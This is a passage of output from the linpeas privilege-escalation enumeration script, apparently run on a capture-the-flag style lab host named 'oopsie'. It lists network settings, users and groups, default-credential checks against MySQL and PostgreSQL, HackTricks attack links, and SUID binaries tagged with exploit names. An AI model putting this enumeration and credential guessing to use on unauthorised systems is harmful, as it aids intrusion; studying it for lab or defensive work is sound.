:1.290                             28127 busctl          robert           :1.290        session-91.scope          91         -
:1.4                                 976 accounts-daemon root             :1.4          accounts-daemon.service   -          -
:1.5                                 965 systemd-logind  root             :1.5          systemd-logind.service    -          -
:1.6                                1094 polkitd         root             :1.6          polkit.service            -          -
:1.7                                 961 networkd-dispat root             :1.7          networkd-dispatcher.se…ce -          -
:1.8                                1092 unattended-upgr root             :1.8          unattended-upgrades.se…ce -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
io.netplan.Netplan                     - -               -                (activatable) -                         -
org.freedesktop.Accounts             976 accounts-daemon root             :1.4          accounts-daemon.service   -          -
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -
org.freedesktop.PolicyKit1          1094 polkitd         root             :1.6          polkit.service            -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1               965 systemd-logind  root             :1.5          systemd-logind.service    -          -
org.freedesktop.network1             756 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -
org.freedesktop.resolve1             814 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -
org.freedesktop.thermald               - -               -                (activatable) -                         -
org.freedesktop.timedate1              - -               -                (activatable) -                         -


════════════════════════════════════╣ Network Information ╠════════════════════════════════════
╔══════════╣ Hostname, hosts and DNS                                                                                
oopsie                                                                                                              
127.0.0.1 localhost
127.0.1.1 oopsie

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0

╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
                                                                                                                    
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                 
link-local 169.254.0.0
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.28  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:ca2b  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:ca2b  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:ca:2b  txqueuelen 1000  (Ethernet)
        RX packets 300144  bytes 38302553 (38.3 MB)
        RX errors 0  dropped 42  overruns 0  frame 0
        TX packets 338431  bytes 571632174 (571.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 57940  bytes 4128276 (4.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57940  bytes 4128276 (4.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Networks and neighbours
Kernel IP routing table                                                                                             
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens160
10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 ens160
Address                  HWtype  HWaddress           Flags Mask            Iface
_gateway                 ether   00:50:56:b9:33:9d   C                     ens160

╔══════════╣ Iptables rules
                                                                                                                    
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                            
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                  
                                                                                                                    

════════════════════════════════════╣ Users Information ╠════════════════════════════════════
╔══════════╣ My user                                                                                                
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                 
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                        

╔══════════╣ Clipboard or highlighted text?
                                                                                                                    
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
                                                                                                                    
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                   
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                               
gdb wasn't found in PATH

╔══════════╣ Checking doas.conf
                                                                                                                    
╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2               
                                                                                                                    
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                     

╔══════════╣ Users with console
robert:x:1000:1000:robert:/home/robert:/bin/bash                                                                    
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                              
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup),1000(robert)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 07:57:52 up  5:56,  1 user,  load average: 0.56, 0.15, 0.06                                                        
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
robert   pts/2    10.10.14.15      07:56   40.00s  0.23s  0.00s bash linpeas.sh

╔══════════╣ Last logons
robert   pts/2        Thu Jul  8 07:56:33 2021   still logged in                       10.10.14.15                  

wtmp begins Thu Jul  8 07:56:33 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                   
root             tty1                      Fri Sep 11 11:51:24 +0000 2020
robert           pts/2    10.10.14.15      Thu Jul  8 07:56:33 +0000 2021

╔══════════╣ Password policy
PASS_MAX_DAYS   99999                                                                                               
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                              
                                                                                                                    
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                    


════════════════════════════════════╣ Software Information ╠════════════════════════════════════
╔══════════╣ MySQL version                                                                                          
mysql  Ver 14.14 Distrib 5.7.29, for Linux (x86_64) using  EditLine wrapper                                         

═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                          
═╣ MySQL connection using root/NOPASS ................. No                                                          
╔══════════╣ Searching mysql credentials and exec                                                                   
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                     
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analizing PostgreSQL Files (limit 70)
Version:                                                                                                            




═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No                                             
═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                             
═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                             
                                                                                                                    
╔══════════╣ Analizing Mongo Files (limit 70)
Version:                                                                                                            

╔══════════╣ Analizing Apache Files (limit 70)
Version: Server version: Apache/2.4.29 (Ubuntu)                                                                     
Server built:   2019-09-16T12:58:48
══╣ PHP exec extensions
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">                                              
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
drwxr-xr-x 2 root root 4096 Jan 23  2020 /etc/apache2/sites-enabled
sed: -e expression #1, char 0: no previous regular expression
sed: -e expression #1, char 0: no previous regular expression
        # The ServerName directive sets the request scheme, hostname and port that
        # redirection URLs. In the context of virtual hosts, the ServerName
        #ServerName www.example.com


-rw-r--r-- 1 root root 0 Jan 23  2020 /var/lib/apache2/site/enabled_by_admin/000-default

╔══════════╣ Analizing Tomcat Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing FastCGI Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Http conf Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Htpasswd Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing PHPCookies Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Wordpress Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Drupal Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Moodle Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Supervisord Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Cesi Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Dec 13  2017 /usr/share/doc/rsync/examples/rsyncd.conf                                  
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analizing Hostapd Files (limit 70)
                                                                                                                    
╔══════════╣ Searching wifi conns file
                                                                                                                    
╔══════════╣ Analizing Anaconda-ks Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing VNC Files (limit 70)
                                                                                                                    




╔══════════╣ Analizing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                
drwxr-xr-x 2 root root 4096 Jan 27  2020 /etc/ldap


╔══════════╣ Analizing Open VPN Files (limit 70)
                                                                                                                    
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analizing SSH FILES Files (limit 70)                                                                   
                                                                                                                    




PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                               
/snap/core/7270/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/7270/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/7270/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/7270/etc/ssl/certs/AddTrust_External_Root.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/7270/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/7270/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/7270/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core/7270/etc/ssl/certs/ca-certificates.crt
/snap/core/7270/etc/ssl/certs/CA_Disig_Root_R2.pem
23256PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                      
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                    


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                  
                                                                                                                    
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                
                                                                                                                    
╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                 
                                                                                                                    
╔══════════╣ Analizing Knockd Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Kibana Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Elasticsearch Files (limit 70)
The version is                                                                                                      

╔══════════╣ Searching logstash files
                                                                                                                    
╔══════════╣ Searching Vault-ssh files
                                                                                                                    
╔══════════╣ Searching AD cached hashes
                                                                                                                    
╔══════════╣ Searching screen sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
No Sockets found in /run/screen/S-robert.                                                                           

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
                                                                                                                    
╔══════════╣ Analizing CouchDB Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Redis Files (limit 70)
                                                                                                                    
╔══════════╣ Searching dovecot files
                                                                                                                    
╔══════════╣ Analizing Mosquitto Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Neo4j Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Cloud credentials Files (limit 70)
                                                                                                                    









╔══════════╣ Analizing Cloud-Init Files (limit 70)
-rw-r--r-- 1 root root 3612 May 11  2019 /etc/cloud/cloud.cfg                                                       
     lock_passwd: True
-rw-r--r-- 1 root root 3612 May 15  2019 /snap/core/7270/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core/8268/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analizing CloudFlare Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Erlang Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing GMV Auth Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing IPSec Files (limit 70)
                                                                                                                    

╔══════════╣ Analizing IRSSI Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings                                          
drwxr-xr-x 2 root root 121 Dec  6  2019 /snap/core/8268/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug  5  2019 /usr/share/keyrings




╔══════════╣ Analizing Filezilla Files (limit 70)
                                                                                                                    

╔══════════╣ Analizing Backup Manager Files (limit 70)
                                                                                                                    

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                      
passwd file: /etc/passwd
passwd file: /snap/core/7270/etc/pam.d/passwd
passwd file: /snap/core/7270/etc/passwd
passwd file: /snap/core/7270/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7270/var/lib/extrausers/passwd
passwd file: /snap/core/8268/etc/pam.d/passwd
passwd file: /snap/core/8268/etc/passwd
passwd file: /snap/core/8268/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8268/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching GitLab related files
                                                                                                                    

╔══════════╣ Analizing Github Files (limit 70)
                                                                                                                    



╔══════════╣ Analizing Svn Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                        

-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 13395 Jun 21  2019 /snap/core/7270/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Dec  6  2019 /snap/core/8268/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 4 robert robert 4096 Jul  8 07:57 /home/robert/.gnupg

╔══════════╣ Analizing Cache Vi Files (limit 70)
                                                                                                                    

╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                   
                                                                                                                    
╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                             
                                                                                                                    
╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                
                                                                                                                    
╔══════════╣ Analizing Firefox Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Chrome Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Autologin Files (limit 70)
                                                                                                                    

╔══════════╣ S/Key authentication
                                                                                                                    
╔══════════╣ YubiKey authentication
                                                                                                                    
╔══════════╣ Passwords inside pam.d
                                                                                                                    
╔══════════╣ Analizing SNMP Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Pypirc Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Ldaprc Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Env Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Msmtprc Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Keepass Files (limit 70)
                                                                                                                    



╔══════════╣ Analizing FTP Files (limit 70)
                                                                                                                    

-rw-r--r-- 1 root root 69 Jan 13  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jan 13  2020 /usr/share/php7.2-common/common/ftp.ini



╔══════════╣ Analizing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind                                 
sed: -e expression #1, char 0: no previous regular expression



╔══════════╣ Analizing SeedDMS Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Ddclient Files (limit 70)
                                                                                                                    
╔══════════╣ Analizing Interesting logs Files (limit 70)
                                                                                                                    

╔══════════╣ Analizing Windows Files Files (limit 70)
                                                                                                                    




















lrwxrwxrwx 1 root root 20 Jan 23  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jan 23  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Jan 27  2020 /var/lib/dpkg/alternatives/my.cnf




-rw-r--r-- 1 root root 71817 Jan 13  2020 /etc/php/7.2/apache2/php.ini
-rw-r--r-- 1 root root 71429 Jan 13  2020 /etc/php/7.2/cli/php.ini





drwxr-xr-x 4 root root 4096 Aug  5  2019 /etc/security
drwxr-xr-x 4 root root 223 Jun 21  2019 /snap/core/7270/etc/security
drwxr-xr-x 2 root root 974 Jun 21  2019 /snap/core/7270/lib/x86_64-linux-gnu/security
drwxr-xr-x 4 root root 223 Dec  6  2019 /snap/core/8268/etc/security
drwxr-xr-x 2 root root 974 Dec  6  2019 /snap/core/8268/lib/x86_64-linux-gnu/security
drwxr-xr-x 2 root root 4096 Jan 23  2020 /usr/src/linux-headers-4.15.0-74-generic/include/config/default/security
drwxr-xr-x 2 root root 4096 Jan 23  2020 /usr/src/linux-headers-4.15.0-74-generic/include/config/nfsd/v4/security
drwxr-xr-x 2 root root 4096 Jan 23  2020 /usr/src/linux-headers-4.15.0-74-generic/include/config/nfs/v4/security
drwxr-xr-x 9 root root 4096 Jan 23  2020 /usr/src/linux-headers-4.15.0-74-generic/include/config/security
lrwxrwxrwx 1 root root 35 Dec 18  2019 /usr/src/linux-headers-4.15.0-74-generic/security -> ../linux-headers-4.15.0-74/security
drwxr-xr-x 10 root root 4096 Jan 23  2020 /usr/src/linux-headers-4.15.0-74/security
drwxr-xr-x 2 root root 4096 Jan 27  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/default/security
drwxr-xr-x 2 root root 4096 Jan 27  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/nfsd/v4/security
drwxr-xr-x 2 root root 4096 Jan 27  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/nfs/v4/security
drwxr-xr-x 9 root root 4096 Jan 27  2020 /usr/src/linux-headers-4.15.0-76-generic/include/config/security
lrwxrwxrwx 1 root root 35 Jan 17  2020 /usr/src/linux-headers-4.15.0-76-generic/security -> ../linux-headers-4.15.0-76/security
drwxr-xr-x 10 root root 4096 Jan 27  2020 /usr/src/linux-headers-4.15.0-76/security
-rw-r--r-- 1 root root 0 Jan 23  2020 /var/lib/apache2/conf/enabled_by_maint/security




















╔══════════╣ Analizing Other Interesting Files Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                          
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 /home/robert/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/7270/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8268/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 robert robert 807 Apr  4  2018 /home/robert/.profile
-rw-r--r-- 1 root root 655 May  9  2019 /snap/core/7270/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8268/etc/skel/.profile





════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                    
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6                                     
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                                
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                                
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                    
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                     
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                     
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
